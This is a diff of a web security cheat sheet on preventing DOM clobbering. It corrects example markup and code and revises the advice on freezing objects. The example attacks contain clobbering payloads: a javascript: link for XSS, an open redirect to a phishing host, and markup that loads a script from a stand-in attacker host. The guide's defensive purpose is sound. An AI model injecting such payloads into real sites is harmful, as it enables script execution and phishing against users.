@@ -1469,10 +1469,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#3-freezing-sensitive-dom-objects" class="md-nav__link">
+  <a href="#3-freezing-application-configuration-objects" class="md-nav__link">
     <span class="md-ellipsis">
       
-        #3: Freezing Sensitive DOM Objects
+        #3: Freezing Application Configuration Objects
       
     </span>
   </a>
@@ -4784,10 +4784,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#3-freezing-sensitive-dom-objects" class="md-nav__link">
+  <a href="#3-freezing-application-configuration-objects" class="md-nav__link">
     <span class="md-ellipsis">
       
-        #3: Freezing Sensitive DOM Objects
+        #3: Freezing Application Configuration Objects
       
     </span>
   </a>
@@ -4966,9 +4966,9 @@
 <p>Before we dive into DOM Clobbering, let's refresh our knowledge with some basic Web background.</p>
 <p>When a webpage is loaded, the browser creates a <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction">DOM tree</a> that represents the structure and content of the page, and JavaScript code has read and write access to this tree.</p>
 <p>When creating the DOM tree, browsers also create an attribute for (some) named HTML elements on <code>window</code> and <code>document</code> objects. Named HTML elements are those having an <code>id</code> or <code>name</code> attribute. For example, the markup:</p>
-<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span> <span class="na">name</span><span class="o">=</span><span class="s">x</span><span class="p">&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
 </code></pre></div>
-<p>will lead to browsers creating references to that form element with the attribute <code>x</code> of <code>window</code> and <code>document</code>:</p>
+<p>creates named references to the form on <code>window</code> and <code>document</code>. The <code>name</code> attribute is needed for <a href="https://html.spec.whatwg.org/multipage/dom.html#dom-document-nameditem">named access on <code>document</code></a>; a form's <code>id</code> alone does not provide that reference:</p>
 <div class="highlight"><pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">obj1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'x'</span><span class="p">);</span>
 <span class="kd">var</span><span class="w"> </span><span class="nx">obj2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">x</span><span class="p">;</span>
 <span class="kd">var</span><span class="w"> </span><span class="nx">obj3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">x</span><span class="p">;</span>
@@ -4988,16 +4988,16 @@ it can change the value of a variable that the web application relies on due to 
 </code></pre></div>
 <p>The attacker can:</p>
 <ul>
-<li>inject the markup <code>&lt;a id=redirectTo href='javascript:alert(1)'</code> and obtain XSS.</li>
-<li>inject the markup <code>&lt;a id=redirectTo href='phishing.com'</code> and obtain open redirect.</li>
+<li>inject the markup <code>&lt;a id=redirectTo href='javascript:alert(1)'&gt;&lt;/a&gt;</code> and obtain XSS.</li>
+<li>inject the markup <code>&lt;a id=redirectTo href='https://phishing.example/'&gt;&lt;/a&gt;</code> and obtain open redirect.</li>
 </ul>
 <h3 id="example-attack-2">Example Attack 2<a class="headerlink" href="#example-attack-2" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'script'</span><span class="p">);</span>
 <span class="kd">let</span><span class="w"> </span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">url</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s1">'script.js'</span><span class="p">;</span>
-<span class="nx">s</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">src</span><span class="p">;</span>
-<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
+<span class="nx">script</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">src</span><span class="p">;</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
 </code></pre></div>
-<p>The attacker can inject the markup <code>&lt;a id=config&gt;&lt;a id=config name=url href='malicious.js'&gt;</code> to load additional JavaScript code, and obtain arbitrary client-side code execution.</p>
+<p>The attacker can inject the markup <code>&lt;a id=config&gt;&lt;/a&gt;&lt;a id=config name=url href='https://attacker.example/payload.js'&gt;&lt;/a&gt;</code> to load additional JavaScript code, and obtain arbitrary client-side code execution.</p>
 <h2 id="summary-of-guidelines">Summary of Guidelines<a class="headerlink" href="#summary-of-guidelines" title="Permanent link">&para;</a></h2>
 <p>For quick reference, below is the summary of guidelines discussed next.</p>
 <table>
@@ -5021,8 +5021,8 @@ it can change the value of a variable that the web application relies on due to 
 </tr>
 <tr>
 <td># 3</td>
-<td>Freeze Sensitive DOM Objects</td>
-<td><a href="#3-freezing-sensitive-dom-objects">link</a></td>
+<td>Freeze Application Configuration Objects</td>
+<td><a href="#3-freezing-application-configuration-objects">link</a></td>
 </tr>
 <tr>
 <td># 4</td>
@@ -5102,9 +5102,9 @@ it can change the value of a variable that the web application relies on due to 
 <h3 id="2-content-security-policy">#2: Content-Security Policy<a class="headerlink" href="#2-content-security-policy" title="Permanent link">&para;</a></h3>
 <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content-Security Policy (CSP)</a> is a set of rules that tell the browser which resources are allowed to be loaded on a web page. By restricting the sources of JavaScript files (e.g., with the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src">script-src</a> directive), CSP can prevent malicious code from being injected into the page.</p>
 <p><strong>Note:</strong> CSP can only mitigate <strong>some variants</strong> of DOM clobbering attacks, such as when attackers attempt to load new scripts by clobbering script sources, but not when already-present code can be abused for code execution, e.g., clobbering the parameters of code evaluation constructs like <code>eval()</code>.</p>
-<h3 id="3-freezing-sensitive-dom-objects">#3: Freezing Sensitive DOM Objects<a class="headerlink" href="#3-freezing-sensitive-dom-objects" title="Permanent link">&para;</a></h3>
-<p>A simple way to mitigate DOM Clobbering against individual objects could be to freeze sensitive DOM objects and their properties, e.g., via <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze">Object.freeze()</a> method.</p>
-<p><strong>Note:</strong> Freezing object properties prevents them from being overwritten by named DOM elements. But, determining all objects and object properties that need to be frozen may be not be easy, limiting the usefulness of this approach.</p>
+<h3 id="3-freezing-application-configuration-objects">#3: Freezing Application Configuration Objects<a class="headerlink" href="#3-freezing-application-configuration-objects" title="Permanent link">&para;</a></h3>
+<p>Use <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze#description">Object.freeze()</a> only as an additional control for application-owned configuration objects initialized with trusted values and retained in local scope. It prevents replacement of their own data properties, but is shallow: nested objects and values returned by getters can still change.</p>
+<p>Do not rely on freezing <code>window</code>, <code>document</code>, or DOM elements to prevent named-property clobbering. For example, <a href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#windowproxy-preventextensions"><code>window</code> rejects attempts to prevent extensions</a>, so <code>Object.freeze(window)</code> throws. Use <a href="#1-html-sanitization">HTML sanitization</a> and <a href="#11-limit-variables-to-local-scope">local variables</a> to avoid attacker-controlled named-property lookups.</p>
 <h2 id="secure-coding-guidelines">Secure Coding Guidelines<a class="headerlink" href="#secure-coding-guidelines" title="Permanent link">&para;</a></h2>
 <p>DOM Clobbering can be avoided by defensive programming and adhering to a few coding patterns and guidelines.</p>
 <h3 id="4-validate-all-inputs-to-dom-tree">#4: Validate All Inputs to DOM Tree<a class="headerlink" href="#4-validate-all-inputs-to-dom-tree" title="Permanent link">&para;</a></h3>
